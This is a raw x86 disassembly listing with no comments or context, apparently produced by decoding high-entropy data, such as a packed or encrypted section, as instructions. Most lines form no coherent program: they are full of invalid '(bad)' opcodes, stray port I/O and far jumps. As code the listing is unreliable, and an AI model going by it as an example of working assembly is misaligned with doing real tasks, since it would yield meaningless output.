  419be2:	jns    0x419b98
  419be4:	mov    dl,0xcb
  419be6:	jecxz  0x419c2e
  419be8:	jns    0x419c27
  419bea:	xor    BYTE PTR [ebx-0x1d],dh
  419bed:	dec    esi
  419bee:	rol    BYTE PTR [esi],1
  419bf0:	mov    edx,0xa1117bbd
  419bf5:	mov    WORD PTR [eax+0xc],ds
  419bf8:	sbb    DWORD PTR [esi-0x298525b3],0xc5477e1a
  419c02:	adc    al,0x7f
  419c04:	icebp  
  419c05:	push   esp
  419c06:	ret    0xca1a
  419c09:	add    esp,DWORD PTR [ebx-0x1e]
  419c0c:	ins    BYTE PTR es:[edi],dx
  419c0d:	mov    ah,0xc0
  419c0f:	dec    edx
  419c10:	(bad)  
  419c11:	(bad)  
  419c12:	out    0xdf,eax
  419c14:	sub    eax,0x8caef1d1
  419c19:	xor    BYTE PTR [eax+0x309ba19b],dl
  419c1f:	fiadd  WORD PTR [edi+0x65dbccf1]
  419c25:	cdq    
  419c26:	pop    ebp
  419c27:	icebp  
  419c28:	sahf   
  419c29:	xor    eax,0xb2445717
  419c2e:	pop    es
  419c2f:	rcl    DWORD PTR [ecx+eax*4+0x6fe9b44f],cl
  419c36:	ss sub al,0x8d
  419c39:	sbb    ah,BYTE PTR [ebx*1-0x34428fd6]
  419c40:	jbe    0x419c30
  419c42:	ins    DWORD PTR es:[edi],dx
  419c43:	pop    edi
  419c44:	adc    DWORD PTR [ecx+0x6a38d302],ecx
  419c4a:	push   eax
  419c4b:	xor    ch,al
  419c4d:	cdq    
  419c4e:	(bad)  
  419c4f:	pusha  
  419c50:	mov    dl,0xd7
  419c52:	or     BYTE PTR [ecx+edi*4-0x5d413b62],dl
  419c59:	popa   
  419c5a:	cmp    al,0x9f
  419c5c:	mov    eax,ds:0x53f8292a
  419c61:	std    
  419c62:	dec    ebx
  419c63:	cmp    al,0x74
  419c65:	and    ecx,DWORD PTR [eax-0x13]
  419c68:	xchg   ecx,eax
  419c69:	sbb    al,0x37
  419c6b:	pop    ss
  419c6c:	or     eax,0xa5644eae
  419c71:	push   0x27262d54
  419c76:	retf   
  419c77:	push   edx
  419c78:	leave  
  419c79:	xor    eax,0xba1a488d
  419c7e:	ins    BYTE PTR es:[edi],dx
  419c7f:	imul   DWORD PTR [ecx+0x5071799b]
  419c85:	add    eax,0xbd632004
  419c8a:	sub    al,BYTE PTR [edx-0x76]
  419c8d:	cmp    DWORD PTR [ecx],0x6b
  419c90:	xchg   edx,eax
  419c91:	mov    esi,0xe8bd5823
  419c96:	xchg   esp,eax
  419c97:	jle    0x419c88
  419c99:	sub    ah,0x9
  419c9c:	shl    DWORD PTR [edx],1
  419c9e:	and    al,dh
  419ca0:	dec    ebp
  419ca1:	cs in  eax,0xf1
  419ca4:	ss inc ecx
  419ca6:	xchg   ecx,eax
  419ca7:	cmp    DWORD PTR [ecx-0x192edc6e],0xfe04e50d
  419cb1:	sar    BYTE PTR [edx-0x1dc62acd],0x8c
  419cb8:	fadd   QWORD PTR [eax-0x48]
  419cbb:	push   ds
  419cbc:	mov    esp,0x1face2bb
  419cc1:	arpl   WORD PTR [eax-0x24],cx
  419cc4:	pop    ds
  419cc5:	rcl    ch,1
  419cc7:	jg     0x419cf6
  419cc9:	js     0x419ca8
  419ccb:	cmc    
  419ccc:	imul   edx,DWORD PTR [ebx-0x6],0xbcfc1348
  419cd3:	xor    al,0x66
  419cd5:	andnps xmm4,XMMWORD PTR [ecx-0x47]
  419cd9:	mov    eax,0x8465a369
  419cde:	add    DWORD PTR [edi+0x6ff54512],0x4d6193fd
  419ce8:	pop    ebx
  419ce9:	test   al,0x64
  419ceb:	dec    esi
  419cec:	rcr    BYTE PTR [ebx],cl
  419cee:	fnstenv ds:0x583d173d
  419cf4:	inc    eax
  419cf5:	sbb    dl,ah
  419cf7:	sahf   
  419cf8:	push   edx
  419cf9:	je     0x419d31
  419cfb:	xchg   esi,eax
  419cfc:	xlat   BYTE PTR ds:[ebx]
  419cfd:	shl    edi,cl
  419cff:	dec    ebp
  419d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d01:	in     al,0xa
  419d03:	and    DWORD PTR [ebx-0xfc414c9],esp
  419d09:	or     dl,BYTE PTR [edi+0x14]
  419d0c:	jp     0x419d50
  419d0e:	popa   
  419d0f:	adc    bl,BYTE PTR ds:0x12747ff4
  419d15:	in     eax,dx
  419d16:	(bad)  [eax-0x7d]
  419d19:	mov    edx,0x2bc95965
  419d1e:	sub    eax,0x2ef31d3c
  419d23:	mov    esp,0x703f4504
  419d28:	popa   
  419d29:	push   esi
  419d2a:	pop    edx
  419d2b:	adc    eax,0xf716e3e1
  419d30:	gs pop edi
  419d32:	add    eax,0x6fd31a24
  419d37:	push   esi
  419d38:	pop    esi
  419d39:	jg     0x419d37
  419d3b:	cs test eax,0xae56a7a7
  419d41:	add    al,ch
  419d43:	(bad)  
  419d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d45:	sbb    edi,DWORD PTR [ebx]
  419d47:	mov    BYTE PTR [ebp-0x28802c6c],cl
  419d4d:	mov    BYTE PTR [ebp+eax*2+0x12],bl
  419d51:	aad    0x9c
  419d53:	dec    esp
  419d54:	outs   dx,DWORD PTR ds:[esi]
  419d55:	adc    eax,0x29925806
  419d5a:	cmp    al,0x1c
  419d5c:	xor    BYTE PTR [esi+0x3a],0x52
  419d60:	jp     0x419da0
  419d62:	ins    DWORD PTR es:[edi],dx
  419d63:	dec    esi
  419d64:	jnp    0x419d87
  419d66:	and    eax,esi
  419d68:	mov    BYTE PTR ds:0xdcb58510,ch
  419d6e:	retf   0x7ad1
  419d71:	stc    
  419d72:	xor    ebp,DWORD PTR [ebx+0x5b]
  419d75:	mov    bh,0xa5
  419d77:	ficom  WORD PTR [ecx+ebx*4+0x2678bace]
  419d7e:	jo     0x419d5f
  419d80:	mov    ebx,0xd2adeec3
  419d85:	pop    edx
  419d86:	lds    edx,FWORD PTR [esi+0x36ca2663]
  419d8c:	pop    edx
  419d8d:	sbb    ecx,DWORD PTR [edi-0x76a387e3]
  419d93:	shl    edx,cl
  419d95:	out    0xc9,al
  419d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d98:	push   esp
  419d99:	push   0xffffffe6
  419d9b:	jge    0x419d9f
  419d9d:	push   0x7edaa87
  419da2:	loop   0x419dd9
  419da4:	jge    0x419d50
  419da6:	dec    esi
  419da7:	in     al,0xbe
  419da9:	adc    eax,0xbcce83d0
  419dae:	sub    BYTE PTR [ebx+0x2b],al
  419db1:	ins    DWORD PTR es:[edi],dx
  419db2:	push   edx
  419db3:	cmp    cl,BYTE PTR [ebp+0x24]
  419db6:	dec    ebp
  419db7:	js     0x419d88
  419db9:	cdq    
  419dba:	and    al,0x74
  419dbc:	sub    DWORD PTR [edx],0x64
  419dbf:	mov    esp,0x936266d6
  419dc4:	mov    ds:0x9eb82920,eax
  419dc9:	in     eax,0xea
  419dcb:	jnp    0x419d62
  419dcd:	hlt    
  419dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dcf:	xor    BYTE PTR [ecx+0x7c8d7e7e],0x43
  419dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd7:	pusha  
  419dd8:	dec    eax
  419dd9:	mov    al,0x50
  419ddb:	enter  0x6dce,0x35
  419ddf:	cmp    BYTE PTR [ebx*8+0x41892e9d],0x31
  419de7:	mov    dx,0x8168
  419deb:	or     al,0xf6
  419ded:	(bad)  
  419dee:	out    dx,eax
  419def:	sbb    eax,0x81dea39d
  419df4:	inc    edi
  419df5:	jmp    0x419dbd
  419df7:	jle    0x419d97
  419df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dfa:	jnp    0x419de2
  419dfc:	sbb    al,bl
  419dfe:	dec    ebp
  419dff:	test   al,0xee
  419e01:	push   esp
  419e02:	cmp    DWORD PTR [esi+edx*4-0x284798b0],ecx
  419e09:	popa   
  419e0a:	or     DWORD PTR [eax-0x5d],ebx
  419e0d:	mov    dh,0xbf
  419e0f:	mov    ebx,0x3bd0cf1f
  419e14:	idiv   edx
  419e16:	mov    eax,0xaa4ee4d0
  419e1b:	xchg   BYTE PTR [ebp+0x51be7528],cl
  419e21:	dec    ebx
  419e22:	add    bl,bh
  419e24:	ins    BYTE PTR es:[edi],dx
  419e25:	aad    0xc2
  419e27:	lds    ebp,FWORD PTR [ebx+0x2c8af895]
  419e2d:	jbe    0x419e17
  419e2f:	(bad)  
  419e30:	out    0xcf,eax
  419e32:	lods   al,BYTE PTR ds:[esi]
  419e33:	gs inc ebx
  419e35:	rcl    DWORD PTR [edx-0x39850faf],1
  419e3b:	les    ebx,FWORD PTR [ecx+0x65]
  419e3e:	mov    ah,0xa3
  419e40:	sbb    eax,0xa37cf50c
  419e45:	jb     0x419e4d
  419e47:	jge    0x419ec7
  419e49:	sbb    edx,DWORD PTR [ebp+edx*2+0x5005b23d]
  419e50:	gs ins DWORD PTR es:[edi],dx
  419e52:	mov    dh,0x4c
  419e54:	add    al,0x4b
  419e56:	pop    esp
  419e57:	enter  0x5a25,0xbf
  419e5b:	cmp    eax,0x518087ff
  419e60:	les    ecx,FWORD PTR [edi-0x783724ff]
  419e66:	lock out dx,eax
  419e68:	pushf  
  419e69:	shl    DWORD PTR [eax],0x12
  419e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e6d:	int3   
  419e6e:	push   eax
  419e6f:	mov    ds:0x35d7a47,eax
  419e74:	dec    esi
  419e75:	jmp    0x47ff:0xc22a114b
  419e7c:	or     esi,DWORD PTR [ebx]
  419e7e:	dec    eax
  419e7f:	pop    edx
  419e80:	les    edx,FWORD PTR [ebx]
  419e82:	xchg   esp,eax
  419e83:	xchg   edx,eax
  419e84:	xor    cl,ch
  419e86:	sub    esi,edi
  419e88:	pop    ebx
  419e89:	into   
  419e8a:	outs   dx,DWORD PTR ds:[esi]
  419e8b:	scas   al,BYTE PTR es:[edi]
  419e8c:	fistp  WORD PTR [esi-0x41]
  419e8f:	jle    0x419ebf
  419e91:	loop   0x419eb8
  419e93:	dec    ebp
  419e94:	jle    0x419eac
  419e96:	adc    al,cl
  419e98:	lahf   
  419e99:	jb     0x419efb
  419e9b:	gs aad 0xe1
  419e9e:	add    ebp,DWORD PTR [edx]
  419ea0:	out    0x9a,al
  419ea2:	or     BYTE PTR [ebx+0x21ff0b68],bh
  419ea8:	sub    DWORD PTR [ebx],0x41
  419eab:	fwait
  419eac:	nop
  419ead:	ja     0x419f1c
  419eaf:	sub    eax,0xd365af3d
  419eb4:	mov    esp,0x6df3a48d
  419eb9:	jge    0x419ed8
  419ebb:	das    
  419ebc:	sub    BYTE PTR [ebx+0x46],ah
  419ebf:	push   edi
  419ec0:	rol    BYTE PTR [eax+0x169818ce],1
  419ec6:	add    ebx,edx
  419ec8:	mov    bl,0x96
  419eca:	mov    bh,0x58
  419ecc:	pop    es
  419ecd:	lock aam 0x51
  419ed0:	shl    esi,1
  419ed2:	ficomp DWORD PTR [ebp+0x24530370]
  419ed8:	inc    esi
  419ed9:	mov    DWORD PTR [edx],ebp
  419edb:	inc    edi
  419edc:	jl     0x419f4f
  419ede:	test   BYTE PTR [eax-0x76],bh
  419ee1:	jmp    DWORD PTR [ecx]
  419ee3:	sbb    eax,0x80806b42
  419ee8:	pop    eax
  419ee9:	ins    DWORD PTR es:[edi],dx
  419eea:	std    
  419eeb:	pop    esi
  419eec:	mov    ecx,0x5f42a919
  419ef1:	(bad)  
  419ef3:	jo     0x419ecb
  419ef5:	sbb    al,0x18
  419ef7:	enter  0xcee9,0xa6
  419efb:	adc    al,0xc1
  419efd:	dec    edx
  419efe:	push   cs
  419eff:	push   es
  419f00:	dec    edx
  419f01:	sbb    eax,ebp
  419f03:	cwde   
  419f04:	push   ecx
  419f05:	or     al,0x2f
  419f07:	add    al,0x87
  419f09:	addr16 push esi
  419f0b:	in     al,0x34
  419f0d:	cmc    
  419f0e:	stos   DWORD PTR es:[edi],eax
  419f0f:	imul   edi,edx,0xdfb532d7
  419f15:	repz cdq 
  419f17:	mov    edi,0x10fa35b4
  419f1c:	out    0xc5,eax
  419f1e:	hlt    
  419f1f:	jne    0x419ec3
  419f21:	mov    dh,BYTE PTR [eax]
  419f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f24:	inc    edi
  419f25:	pop    edx
  419f26:	mov    DWORD PTR [esp+edi*1],esi
  419f29:	dec    edi
  419f2a:	xor    edx,DWORD PTR [eax]
  419f2c:	popa   
  419f2d:	in     eax,0xe0
  419f2f:	popf   
  419f30:	add    al,0x5
  419f32:	inc    eax
  419f33:	(bad)  
  419f34:	mov    esi,0x52e04870
  419f39:	loop   0x419ed7
  419f3b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f3d:	es je  0x419ef2
  419f40:	js     0x419f5d
  419f42:	int3   
  419f43:	mov    cl,0x1f
  419f45:	add    ebx,0xd27ebbec
  419f4b:	mov    ebp,0xc539d657
  419f50:	repz push ebx
  419f52:	aaa    
  419f53:	in     al,0x3f
  419f55:	add    dh,BYTE PTR [ebp-0xdd79ae2]
  419f5b:	(bad)  
  419f5c:	(bad)  
  419f5d:	xor    al,0xb1
  419f5f:	add    DWORD PTR [ecx-0x3a062664],esp
  419f65:	push   edx
  419f66:	xor    esp,DWORD PTR [edi-0x6361d650]
  419f6c:	add    eax,ebx
  419f6e:	mov    ds:0xbb49dc9e,al
  419f73:	seto   BYTE PTR [edx]
  419f76:	hlt    
  419f77:	or     dh,BYTE PTR [esi+0x31]
  419f7a:	repnz and al,0x2c
  419f7d:	nop
  419f7e:	pop    esi
  419f7f:	xor    al,0xfb
  419f81:	add    DWORD PTR [edi+0x55589ef8],esi
  419f87:	(bad)  [edx-0x3a49d615]
  419f8d:	rcr    DWORD PTR [esi],0x33
  419f90:	push   cs
  419f91:	and    ch,BYTE PTR [eax+0x16]
  419f94:	retf   
  419f95:	imul   ebp,DWORD PTR [ecx-0x25862adf],0x1799b9a5
  419f9f:	scas   eax,DWORD PTR es:[edi]
  419fa0:	or     ecx,edi
  419fa2:	xchg   edi,eax
  419fa3:	inc    esp
  419fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa5:	mov    gs,esi
  419fa7:	outs   dx,BYTE PTR ds:[esi]
  419fa8:	push   ebp
  419fa9:	jo     0x419f72
  419fab:	test   eax,0x9d671c58
  419fb0:	sahf   
  419fb1:	inc    esi
  419fb2:	jl     0x419f74
  419fb4:	push   esp
  419fb5:	cmc    
  419fb6:	std    
  419fb7:	rol    BYTE PTR [ecx+0xae2ebbb],0x1b
  419fbe:	shl    DWORD PTR [esi+0x1dc00d02],0x60
  419fc5:	fisub  WORD PTR [ecx]
  419fc7:	or     ah,al
  419fc9:	sub    esi,DWORD PTR [ebp+0xb64c355]
  419fcf:	nop
  419fd0:	jns    0x419fba
  419fd2:	and    DWORD PTR [ecx+edx*8+0x4e],edi
  419fd6:	lods   eax,DWORD PTR ds:[esi]
  419fd7:	sub    esp,ecx
  419fd9:	iret   
  419fda:	cs add eax,0xfd68960
  419fe0:	push   edi
  419fe1:	(bad)  
  419fe2:	clc    
  419fe3:	in     al,dx
  419fe4:	jmp    0x89bc:0xa7d31887
  419feb:	icebp  
  419fec:	shl    BYTE PTR [esi+eax*4],1
  419fef:	cmp    ebp,DWORD PTR ds:0xfd88c227
  419ff5:	int    0x7e
  419ff7:	ja     0x419fb4
  419ff9:	jns    0x41a073
  419ffb:	cs loopne 0x41a06b
  419ffe:	shl    BYTE PTR [edx+0x5a],cl
  41a001:	fs push ebx
  41a003:	mov    bl,0x2a
  41a005:	mov    ds:0x4f44522a,al
  41a00a:	jmp    0x105b:0x63b47375
  41a011:	int3   
  41a012:	js     0x41a08b
  41a014:	les    ecx,FWORD PTR [ebx+0x4a5ee2a9]
  41a01a:	inc    eax
  41a01b:	mov    ebp,0x6b17cb17
  41a020:	or     BYTE PTR [esp+ebp*2-0x61],dl
  41a024:	fld    TBYTE PTR [eax]
  41a026:	mov    edx,0x93a5e6c4
  41a02b:	shr    BYTE PTR [edx-0x25],cl
  41a02e:	add    DWORD PTR [ecx+ecx*1+0x13],ecx
  41a032:	xor    ebx,ebx
  41a034:	jecxz  0x41a083
  41a036:	cmp    eax,0x2add9459
  41a03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a03c:	push   esp
  41a03d:	push   ebp
  41a03e:	std    
  41a03f:	shl    ch,cl
  41a041:	mov    ecx,0x899d21af
  41a046:	mov    dl,0x62
  41a048:	lods   al,BYTE PTR ds:[esi]
  41a049:	sub    DWORD PTR ss:[eax-0x4219298f],eax
  41a050:	(bad)  
  41a051:	popf   
  41a052:	retf   0xe3e0
  41a055:	mov    ds,WORD PTR [ebx+esi*4]
  41a058:	mov    edx,0x47f9a50b
  41a05d:	mov    dh,BYTE PTR [esp-0x5f]
  41a061:	inc    esp
  41a062:	ror    DWORD PTR [eax+0xd0a60d7],0xfb
  41a069:	stos   DWORD PTR es:[edi],eax
  41a06a:	sub    al,0x18
  41a06c:	(bad)  
  41a06d:	cmp    ch,BYTE PTR [edi-0x32638edf]
  41a073:	sbb    eax,0x15f8787d
  41a078:	push   edi
  41a079:	pop    ebx
  41a07a:	int3   
  41a07b:	jmp    0x41a0f4
  41a07d:	sar    BYTE PTR [edi+eax*8+0x76fa157a],0xf2
  41a085:	fadd   st,st(5)
  41a087:	mov    ebp,0x3ca47d3f
  41a08c:	add    dl,ah
  41a08e:	lods   eax,DWORD PTR ds:[esi]
  41a08f:	hlt    
  41a090:	cli    
  41a091:	push   esp
  41a092:	adc    al,0xf9
  41a094:	push   ebx
  41a095:	jne    0x41a078
  41a097:	and    al,0xdc
  41a099:	sbb    eax,DWORD PTR [esi]
  41a09b:	int3   
  41a09c:	adc    dl,BYTE PTR [ebp+0x417fdc1d]
  41a0a2:	aad    0xe
  41a0a4:	shl    cl,0x48
  41a0a7:	sub    cl,BYTE PTR [eax-0x48239f3]
  41a0ad:	(bad)  [ebp-0x46]
  41a0b0:	(bad)  
  41a0b1:	fcmovnu st,st(1)
  41a0b3:	mov    bl,0x46
  41a0b5:	retf   0x6185
  41a0b8:	push   esi
  41a0b9:	cdq    
  41a0ba:	mov    WORD PTR [eax-0x1e],?
  41a0bd:	push   es
  41a0be:	fiadd  WORD PTR [ebx]
  41a0c0:	sbb    ecx,DWORD PTR [eax]
  41a0c2:	pop    edx
  41a0c3:	pop    edi
  41a0c4:	push   ebx
  41a0c5:	mov    DWORD PTR [ebx],ebx
  41a0c7:	mov    bh,ch
  41a0c9:	xchg   ebp,eax
  41a0ca:	fadd   QWORD PTR [ebp+0x11]
  41a0cd:	dec    esi
  41a0ce:	sub    DWORD PTR [edi-0x5fc9a00a],0xb1db98db
  41a0d8:	cli    
  41a0d9:	aad    0x52
  41a0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0dc:	ror    DWORD PTR [eax-0x1a0a4f1e],cl
  41a0e2:	xchg   BYTE PTR [eax-0x6c1b7f27],bh
  41a0e8:	pushf  
  41a0e9:	push   esi
  41a0ea:	pop    ecx
  41a0eb:	cld    
  41a0ec:	push   esp
  41a0ed:	in     eax,dx
  41a0ee:	cld    
  41a0ef:	nop
  41a0f0:	adc    ecx,DWORD PTR [esi]
  41a0f2:	sub    al,0x1b
  41a0f4:	jl     0x41a08c
  41a0f6:	out    0xbb,al
  41a0f8:	sbb    esi,DWORD PTR [edx-0x22]
  41a0fb:	popa   
  41a0fc:	mov    DWORD PTR [ecx+edx*2+0x6d6e282d],esi
  41a103:	sar    DWORD PTR [esi+0x1facad7e],0x49
  41a10a:	dec    edx
  41a10b:	jg     0x41a146
  41a10d:	(bad)  
  41a10e:	jg     0x41a0d0
  41a110:	cli    
  41a111:	repz mov cs,WORD PTR [ecx-0x32]
  41a115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a116:	int3   
  41a117:	les    esi,FWORD PTR [eax]
  41a119:	ficom  WORD PTR [esi+ebx*8-0x242b9010]
  41a120:	jns    0x41a163
  41a122:	or     al,0x88
  41a124:	jmp    0x51df:0x2cd90f9b
  41a12b:	in     eax,0x55
  41a12d:	test   eax,0x6cba5c55
  41a132:	scas   al,BYTE PTR es:[edi]
  41a133:	jmp    0x4be4:0xb67fe7c9
  41a13a:	or     esi,DWORD PTR [eax]
  41a13c:	cmp    al,0x3f
  41a13e:	xor    DWORD PTR [ecx],0xae81a8b7
  41a144:	jno    0x41a19d
  41a146:	sub    al,0x11
  41a148:	(bad)
  41a14b:	jns    0x41a127
  41a14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a14e:	jnp    0x41a16d
  41a150:	mov    ch,0x5c
  41a152:	not    DWORD PTR [ebp+ebx*4+0x5c52cdcd]
  41a159:	mov    ch,0x86
  41a15b:	push   ds
  41a15c:	sub    ecx,DWORD PTR [ecx+0x5e]
  41a15f:	push   0xcc4f7b02
  41a164:	push   ecx
  41a165:	push   ds
  41a166:	push   cs
  41a167:	xchg   edx,eax
  41a168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a169:	jb     0x41a161
  41a16b:	(bad)  
  41a16c:	xchg   ebp,eax
  41a16d:	lea    edx,[ebp+0x31]
  41a170:	std    
  41a171:	push   esp
  41a172:	and    DWORD PTR [edi+0x2731473f],edx
  41a178:	loop   0x41a13e
  41a17a:	cmp    DWORD PTR [ecx-0x2e7a8f7e],ecx
  41a180:	idiv   ebx
  41a182:	mov    al,0xfa
  41a184:	xchg   ebx,eax
  41a185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a186:	push   edx
  41a187:	xchg   edx,eax
  41a188:	jno    0x41a209
  41a18a:	sti    
  41a18b:	hlt    
  41a18c:	(bad)
  41a18f:	(bad)  
  41a190:	out    dx,eax
  41a191:	adc    bl,BYTE PTR [edi]
  41a193:	inc    DWORD PTR [ecx+0x72]
  41a196:	and    BYTE PTR [esi],ch
  41a198:	sbb    DWORD PTR [esi+0xce18408],edi
  41a19e:	mov    esi,DWORD PTR [edx-0x1ea7af15]
  41a1a4:	or     BYTE PTR [edx-0x5963b53d],0xa9
  41a1ab:	inc    esp
  41a1ac:	mov    esp,0xa120502c
  41a1b1:	inc    esp
  41a1b2:	inc    esp
  41a1b3:	loop   0x41a139
  41a1b5:	xor    DWORD PTR [esi],esp
  41a1b7:	add    esp,esi
  41a1b9:	pop    ss
  41a1ba:	mov    cl,0xaf
  41a1bc:	cmp    eax,0x82bef028
  41a1c1:	icebp  
  41a1c2:	cmp    edx,DWORD PTR [eax-0x353556e4]
  41a1c8:	fisub  DWORD PTR [ebx+0x65]
  41a1cb:	(bad)  
  41a1cc:	call   FWORD PTR [edx]
  41a1ce:	inc    edi
  41a1cf:	push   edx
  41a1d1:	inc    eax
  41a1d2:	pop    esp
  41a1d3:	cmp    DWORD PTR [ebx+0x1b],edi
  41a1d6:	mov    ecx,0xf2c32475
  41a1db:	leave  
  41a1dc:	jno    0x41a1a4
  41a1de:	es jnp 0x41a195
  41a1e1:	not    DWORD PTR [ebp-0x7d]
  41a1e4:	or     DWORD PTR [ecx],ecx
  41a1e6:	inc    edx
  41a1e7:	add    ch,BYTE PTR [edi+edi*2+0x26038bf1]
  41a1ee:	loopne 0x41a1c4
  41a1f0:	jmp    0x41a19f
  41a1f2:	inc    esi
  41a1f3:	pop    ebp
  41a1f4:	mul    DWORD PTR [edx-0x6cd94c97]
  41a1fa:	shl    DWORD PTR [edi],cl
  41a1fc:	aas    
  41a1fd:	lea    edi,[edx]
  41a1ff:	js     0x41a231
  41a201:	ror    DWORD PTR [edi-0x5a88b98d],cl
  41a207:	xlat   BYTE PTR ds:[ebx]
  41a208:	add    DWORD PTR [ecx-0x2],eax
  41a20b:	inc    esi
  41a20c:	arpl   WORD PTR [edi-0x5fc3497b],bp
  41a212:	ins    BYTE PTR es:[edi],dx
  41a213:	ror    DWORD PTR [eax],1
  41a215:	pop    ds
  41a216:	ror    DWORD PTR [eax],0x79
  41a219:	sbb    eax,0x321fc016
  41a21e:	pop    ebp
  41a21f:	push   eax
  41a220:	scas   al,BYTE PTR es:[edi]
  41a221:	adc    DWORD PTR [ebp+0x16],esi
  41a224:	jb     0x41a2a3
  41a226:	fidivr DWORD PTR [esi+0x42e33b59]
  41a22c:	dec    edx
  41a22d:	xor    esi,esp
  41a22f:	lahf   
  41a230:	mov    ds:0x4ff42ae3,eax
  41a235:	not    DWORD PTR [edi]
  41a237:	push   eax
  41a238:	pushf  
  41a239:	jo     0x41a21a
  41a23b:	xor    eax,0xb815b9c1
  41a240:	mov    esi,0xde583051
  41a245:	fdiv   DWORD PTR [eax]
  41a247:	mov    bh,0x59
  41a249:	add    esi,DWORD PTR [ebx-0x16955728]
  41a24f:	retf   0xad43
  41a252:	test   DWORD PTR [edx-0x1fc5e2dd],eax
  41a258:	xor    eax,0xab663ebe
  41a25d:	sbb    ecx,eax
  41a25f:	mov    ds:0xab6c515b,al
  41a264:	mov    edx,0xfc46986a
  41a269:	and    al,0x7c
  41a26b:	and    BYTE PTR [edi+0x45],0x42
  41a26f:	adc    DWORD PTR [ecx],esi
  41a271:	push   cs
  41a272:	mov    ah,dl
  41a274:	and    BYTE PTR [ecx],cl
  41a276:	sub    bh,0x6e
  41a279:	test   eax,0xfef7adb7
  41a27e:	push   ss
  41a27f:	and    al,0x0
  41a281:	imul   esi,DWORD PTR [ecx-0x70],0x5ca59e5f
  41a288:	dec    edx
  41a289:	xor    cl,cl
  41a28b:	int    0x15
  41a28d:	push   eax
  41a28e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a28f:	mov    es,ebx
  41a291:	fdivp  st(0),st
  41a293:	jbe    0x41a2da
  41a295:	aam    0xab
  41a297:	lods   al,BYTE PTR ds:[esi]
  41a298:	in     eax,dx
  41a299:	mov    ch,0xae
  41a29b:	add    cl,BYTE PTR [ecx]
  41a29d:	popf   
  41a29e:	aam    0x34
  41a2a0:	adc    al,0xac
  41a2a2:	adc    BYTE PTR [ebp-0x34],0xf5
  41a2a6:	imul   ecx,DWORD PTR [edx],0xffffffb8
  41a2a9:	int    0xd6
  41a2ab:	daa    
  41a2ac:	pop    ecx
  41a2ad:	mov    esp,ecx
  41a2af:	xchg   esi,eax
  41a2b0:	aas    
  41a2b1:	lods   eax,DWORD PTR ds:[esi]
  41a2b2:	mov    al,0x81
  41a2b4:	add    al,0x90
  41a2b6:	ret    
  41a2b7:	and    bl,ch
  41a2b9:	push   DWORD PTR ds:0x48a71a38
  41a2bf:	jecxz  0x41a24d
  41a2c1:	dec    edx
  41a2c2:	push   ds
  41a2c3:	gs push es
  41a2c5:	and    DWORD PTR [ebx+eax*8],edi
  41a2c8:	test   BYTE PTR [ecx-0x9],dh
  41a2cb:	jmp    0x355581a3
  41a2d0:	call   0x30b5:0xa259bcb4
  41a2d7:	and    ah,BYTE PTR [esi+ebx*2]
  41a2da:	repnz lock in al,dx
  41a2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2de:	mov    esi,0xae671b21
  41a2e3:	push   ebx
  41a2e4:	adc    DWORD PTR [edx-0x6a73c2a],ebx
  41a2ea:	add    edx,esp
  41a2ec:	and    edx,DWORD PTR [ecx+0x739a80c9]
  41a2f2:	loop   0x41a276
  41a2f4:	fisubr DWORD PTR [edi]
  41a2f6:	cmp    eax,0xc4e60458
  41a2fb:	fwait
  41a2fc:	mov    al,ds:0x5b93187f
  41a301:	and    bh,al
  41a303:	iret   
  41a304:	addr16 push esi
  41a306:	cli    
  41a307:	out    dx,al
  41a308:	push   ecx
  41a309:	fs or  al,0xfa
  41a30c:	add    eax,0x8303a789
  41a311:	xor    bl,dl
  41a313:	jnp    0x41a38f
  41a315:	mov    ds:0xa94e6930,eax
  41a31a:	pop    edx
  41a31b:	addr16 aad 0x6b
  41a31e:	mov    al,ds:0xfc4b9e15
  41a323:	outs   dx,DWORD PTR ds:[esi]
  41a324:	inc    esp
  41a325:	les    edx,FWORD PTR [ebx]
  41a327:	out    0x5b,eax
  41a329:	push   edi
  41a32a:	mov    ds:0x4ee6b55d,eax
  41a32f:	mov    ah,0x8a
  41a331:	sbb    al,0xf
  41a333:	retf   
  41a334:	sub    eax,0x1ca3e856
  41a339:	test   DWORD PTR [ebp+0x5467ff9f],ebx
  41a33f:	mov    esi,esi
  41a341:	gs aas 
  41a343:	cmp    al,0x69
  41a345:	icebp  
  41a346:	sub    ebx,DWORD PTR [edx+eiz*4]
  41a349:	add    eax,0x8262d666
  41a34e:	adc    bh,BYTE PTR [ebp-0x71fff4e5]
  41a354:	fld    DWORD PTR ds:0x6716db75
  41a35a:	test   al,0xc2
  41a35c:	out    dx,eax
  41a35d:	(bad)  
  41a35e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a35f:	jo     0x41a35d
  41a361:	iret   
  41a362:	scas   al,BYTE PTR es:[edi]
  41a363:	mov    edx,0x2fd6d26f
  41a368:	xchg   ecx,eax
  41a369:	sbb    DWORD PTR gs:[ebx],ebp
  41a36c:	cmc    
  41a36d:	test   BYTE PTR [edx-0x45],0x22
  41a371:	imul   edi,ebx,0x5a
  41a374:	dec    edi
  41a375:	pop    esi
  41a376:	cmp    eax,0xf541900
  41a37b:	pop    esi
  41a37c:	and    DWORD PTR [ecx-0x91398ae],esi
  41a382:	jge    0x41a3f7
  41a384:	push   eax
  41a385:	ret    0x49ee
  41a388:	stos   BYTE PTR es:[edi],al
  41a389:	call   0x1127:0x186d5ce
  41a390:	sbb    al,0x85
  41a392:	iret   
